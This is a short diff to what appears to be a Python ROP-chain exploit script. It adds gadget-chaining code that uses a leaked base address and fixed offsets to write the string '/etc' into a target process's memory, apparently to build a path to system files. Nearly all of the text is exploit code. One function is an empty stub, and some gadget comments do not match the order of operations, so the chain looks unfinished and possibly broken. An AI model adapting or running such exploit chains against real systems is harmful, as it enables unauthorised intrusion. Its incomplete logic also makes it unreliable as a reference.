@@ -28,6 +28,28 @@ def leaked(leaker_start, search_for):
     leak = int(leak[-2], 16)
     return leak, leaker
 
+def write_string_to_mem(rop, string, string_location):
+    '''
+    Writes a string to a location in memory
+    '''
+
+def write_4_bytes_to_mem(rop, binary_start, string, string_location):
+    '''
+    Writes 4 bytes to a location in memory, if string is not
+    4 bytes it will have bytes appended
+    string_location: binary_start - 0x2a50
+    '''
+    # mov rax, [rdi + 0x2a50]; ret;
+    rop.raw(binary_start + 0x0b7470)
+    # The string
+    rop.raw(b'/etc')
+    # pop rax; ret;
+    rop.raw(binary_start  + 0x01f7bd)
+    # rdi
+    rop.raw(string_location)
+    # pop rdi; ret;
+    rop.raw(binary_start + 0x07b62a)
+
 def build(leak, gadget_file):
     # Load the target binary
     with open(gadget_file, 'rb') as i:
@@ -43,8 +65,8 @@ def build(leak, gadget_file):
 
     # mov rax, [rdi + 0x2a50]; ret;
     rop.raw(leak + 0x0b7470)
-    # /
-    rop.raw(b'/')
+    # /etc      4 bytes
+    rop.raw(b'/etc')
     # pop rax; ret;
     rop.raw(leak + 0x01f7bd)
     # rdi - addition to rdi
